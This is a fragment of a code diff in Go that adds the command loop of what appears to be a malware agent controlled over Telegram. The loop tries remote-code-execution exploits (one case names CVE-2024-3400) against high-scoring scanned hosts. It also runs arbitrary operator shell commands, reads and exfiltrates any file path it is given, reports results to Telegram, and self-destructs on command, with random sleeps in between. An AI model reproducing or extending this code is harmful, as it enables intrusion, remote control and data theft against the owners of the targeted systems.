+				if h.Score > 8.0 && (contains(h.Vulns, "rce") || contains(h.Vulns, "CVE-2024-3400")) {
+					if exploitRCE(h) {
+						h.Exploited = true
+						data, _ := json.Marshal(h)
+						exfilData(data)
+						telegramSend(fmt.Sprintf("💥 *RCE SUCCESS* | `%s` | Score: %.2f", h.IP, h.Score))
+					}
+				}
+			}
+
+		case "shell":
+			out, err := exec.Command("sh", "-c", cmd["cmd"]).CombinedOutput()
+			if err != nil {
+				out = append(out, []byte(err.Error())...)
+			}
+			telegramSend(fmt.Sprintf("💻 Output:\n```\n%s\n```", string(out)))
+
+		case "exfil":
+			data, err := ioutil.ReadFile(cmd["path"])
+			if err != nil {
+				telegramSend(fmt.Sprintf("❌ Read failed: %v", err))
+				continue
+			}
+			exfilData(data)
+			telegramSend(fmt.Sprintf("📤 Exfiltrated `%s` (%d bytes)", cmd["path"], len(data)))
+
+		case "die":
+			telegramSend("💀 Agent terminating.")
+			selfDestruct()
+
+		default:
+			time.Sleep(randSleep())
+		}
 	}
+}
+
+func dedupHosts(hosts []*Host) []*Host {
+	seen := make(map[string]bool)
+	result := []*Host{}
+	for _, h := range hosts {
+		key := h.IP + ":" + strconv.Itoa(h.Port)
+		if !seen[key] {
+			seen[key] = true
+			result = append(result, h)
+		}
+	}
+	return result
 }
